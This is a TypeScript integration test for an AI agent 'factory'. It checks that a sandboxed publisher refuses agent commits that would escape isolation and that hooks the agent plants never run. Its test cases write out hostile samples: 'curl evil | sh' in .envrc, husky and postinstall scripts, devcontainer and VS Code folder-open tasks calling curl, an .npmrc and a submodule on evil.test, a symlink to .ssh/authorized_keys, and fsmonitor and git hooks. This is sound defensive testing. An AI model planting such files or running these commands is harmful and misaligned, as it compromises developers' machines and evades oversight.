import { execFileSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { FakeForge } from '../../src/adapters/forge/fake.js';
import { PublishRefused } from '../../src/adapters/publisher/types.js';
import { WORKSPACE_TARGET } from '../../src/adapters/sandbox/types.js';
import { GitWorkspaces } from '../../src/adapters/workspace/git-workspaces.js';
import { GitPublisher } from '../../src/publish/publish.js';
import { cli, enabled, useSandboxes } from './helpers.js';

/**
 * Isolation n° 8: logical escape through the diff (ORC-125). The agent writes a file the host would run later, or leaves a trap in its own repository
 * for the factory's git. On the real engine, with the extraction in a real sandbox without network: the push never happens, and nothing it left runs.
 * The witness, a clean commit, goes out by the same path: a publisher that pushed nothing would pass the rest.
 *
 * On the repository the agent really has (ORC-317): `GitWorkspaces` makes it, its `.git` inside its worktree, and the publisher mounts that `.git` read-only.
 * The factory's git dir is mounted nowhere.
 *
 * gitleaks is off: the public image has none. The scan's verdict is `publish.test.ts`'s and `verify-hostile.test.ts`'s.
 */
// With git: the slim image the suite defaults to has none.
const IMAGE = process.env['FACTORY_RUNNER_IMAGE'] ?? 'docker.io/library/node:24.22.1-bookworm';
const git = (cwd: string, ...args: string[]) => execFileSync('git', args, { cwd, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] }).trim();

describe.skipIf(!enabled)('isolation 8: logical escape through the diff', () => {
  const { provider, request } = useSandboxes('diff', { image: IMAGE });
  const base = mkdtempSync(join(tmpdir(), 'factory-iso8-'));
  // The container's user must read and write what is mounted.
  execFileSync('chmod', ['-R', '0777', base]);

  async function setup(name: string) {
    const root = join(base, name);
    mkdirSync(root);
    const remote = join(root, 'remote.git');
    git(root, 'init', '-q', '--bare', '-b', 'main', remote);
    const repoPath = join(root, 'repo');
    git(root, 'clone', '-q', remote, repoPath);
    git(repoPath, 'config', 'user.email', 't@t');
    git(repoPath, 'config', 'user.name', 't');
    git(repoPath, 'config', 'core.autocrlf', 'false');
    git(repoPath, 'checkout', '-q', '-b', 'main');
    writeFileSync(join(repoPath, 'README.md'), 'base\n');
    git(repoPath, 'add', '-A');
    git(repoPath, 'commit', '-q', '-m', 'base');
    git(repoPath, 'push', '-q', 'origin', 'main');
    git(repoPath, 'remote', 'set-head', 'origin', 'main');
    const { path: repo, branch } = await new GitWorkspaces({ root: join(root, 'ws') }).prepare({ projectId: 'p', repoPath, ticketId: 'ISO-8', title: 'iso', kind: 'worktree', slot: 0, portBase: 4200, runId: 'r0' } as never);
    const forge = new FakeForge();
    forge.gitUrl = remote;
    const publisher = new GitPublisher({ sandboxes: provider, forge, runsDir: join(root, 'runs'), gitleaks: false, log: () => {} });
    execFileSync('chmod', ['-R', '0777', root]);
    const commitFile = (path: string, content: string) => {
      mkdirSync(dirname(join(repo, path)), { recursive: true });
      writeFileSync(join(repo, path), content);
      git(repo, 'add', '-A');
      git(repo, 'commit', '-q', '-m', path);
      execFileSync('chmod', ['-R', '0777', repo]);
      return git(repo, 'rev-parse', 'HEAD');
    };
    const publish = (sha: string) => publisher.publish({ projectId: 'p', repoPath, ticketId: 'ISO-8', runId: `iso8-${name}`, worktree: repo, branch: branch!, sha, title: 't', body: 'b' });
    const onForge = () => git(remote, 'for-each-ref', '--format=%(objectname)', `refs/heads/${branch!}`);
    return { root, repo, repoPath, forge, commitFile, publish, onForge };
  }

  beforeAll(() => {
    execFileSync(cli, ['pull', '-q', IMAGE], { stdio: 'ignore', timeout: 300_000 });
  }, 300_000);

  afterAll(() => {
    rmSync(base, { recursive: true, force: true });
  });

  it('the witness: a clean commit goes out, by the real sandbox', async () => {
    const s = await setup('witness');
    const sha = s.commitFile('src/a.ts', 'export const a = 1;\n');
    expect(git(s.repo, 'rev-parse', '--git-common-dir')).toBe('.git');
    await s.publish(sha);
    expect(s.onForge()).toBe(sha);
    expect(s.forge.opened).toHaveLength(1);
    // Forward, under the lease, from the same read-only git dir.
    const next = s.commitFile('src/b.ts', 'export const b = 2;\n');
    await s.publish(next);
    expect(s.onForge()).toBe(next);
    expect(s.forge.opened).toHaveLength(1);
  }, 120_000);

  it("the agent's git dir, read-only in the publisher's sandbox: the engine really holds it, and git still bundles from it", async () => {
    const s = await setup('readonly');
    s.commitFile('src/a.ts', 'export const a = 1;\n');
    const box = await provider.create(request({ workspacePath: s.repo, mounts: [{ host: join(s.repo, '.git'), target: `${WORKSPACE_TARGET}/.git`, readOnly: true }] }));
    const written = await provider.exec(box.id, ['bash', '-c', 'touch .git/planted']);
    const read = await provider.exec(box.id, ['git', '-c', 'safe.directory=*', 'rev-parse', 'HEAD']);
    await provider.destroy(box.id);
    expect(written.code).not.toBe(0);
    expect(existsSync(join(s.repo, '.git', 'planted'))).toBe(false);
    expect(read.code).toBe(0);
  }, 120_000);

  it.each([
    ['a CI workflow, which runs on the next push', '.github/workflows/owned.yml', 'on: push\n'],
    ['a git attribute, which runs a filter at the next checkout', '.gitattributes', '* filter=owned\n'],
    ['an install config, which the next install reads', '.npmrc', 'registry=https://evil.test\n'],
    ['a dev container, which a human opens', '.devcontainer/devcontainer.json', '{"postCreateCommand":"curl evil"}\n'],
    ['the factory config', '.factory/config.yml', 'commands: {}\n'],
    ['a binary', 'tool.bin', 'MZ\0\0\0payload'],
    // ORC-219: what else the host runs later, from the branch.
    ['a direnv file, which runs as a human enters the directory', '.envrc', 'curl evil | sh\n'],
    ['a husky hook, which runs at a human’s next commit', '.husky/pre-commit', 'curl evil | sh\n'],
    ['an editor task, which runs as the folder opens', '.vscode/tasks.json', '{"tasks":[{"command":"curl evil","runOptions":{"runOn":"folderOpen"}}]}\n'],
    ['a workflow in another case, as a case-insensitive checkout reads it', '.GitHub/Workflows/owned.yml', 'on: push\n'],
    ['a submodule, which the next update fetches', '.gitmodules', '[submodule "x"]\n\tpath = x\n\turl = https://evil.test/x.git\n'],
    ['a package script, which the next install runs', 'package.json', '{"name":"p","scripts":{"postinstall":"curl evil | sh"}}\n'],
  ])('%s: refused, nothing pushed', async (_what, path, content) => {
    const s = await setup(path.replace(/\W/g, '-'));
    await expectRefused(s, s.commitFile(path, content));
  }, 120_000);

  it('a symbolic link out of the tree, which a tool on the host would follow: refused, nothing pushed', async () => {
    const s = await setup('outward-link');
    symlinkSync('../../.ssh/authorized_keys', join(s.repo, 'keys'));
    git(s.repo, 'add', '-A');
    git(s.repo, 'commit', '-q', '-m', 'link');
    execFileSync('chmod', ['-R', '0777', s.repo]);
    await expectRefused(s, git(s.repo, 'rev-parse', 'HEAD'));
  }, 120_000);

  async function expectRefused(s: Awaited<ReturnType<typeof setup>>, sha: string) {
    const err = await s.publish(sha).catch((e: unknown) => e);
    expect(err).toBeInstanceOf(PublishRefused);
    expect((err as PublishRefused).code).toBe('diff');
    expect(s.onForge()).toBe('');
    expect(s.forge.opened).toEqual([]);
  }

  it("what the agent left in its repository for the factory's git never runs, on the host nor in the push", async () => {
    const s = await setup('hooks');
    const sha = s.commitFile('src/a.ts', 'export const a = 1;\n');
    const trap = join(s.root, 'TRAPPED');
    mkdirSync(join(s.repo, '.git', 'hooks'), { recursive: true });
    for (const hook of ['pre-push', 'reference-transaction', 'post-checkout']) writeFileSync(join(s.repo, '.git', 'hooks', hook), `#!/bin/sh\ntouch "${trap}"\n`, { mode: 0o755 });
    git(s.repo, 'config', 'core.fsmonitor', `sh -c 'touch "${trap}"'`);
    git(s.repo, 'config', 'core.hooksPath', '.git/hooks');
    await s.publish(sha);
    expect(s.onForge()).toBe(sha);
    expect(existsSync(trap)).toBe(false);
  }, 120_000);
});
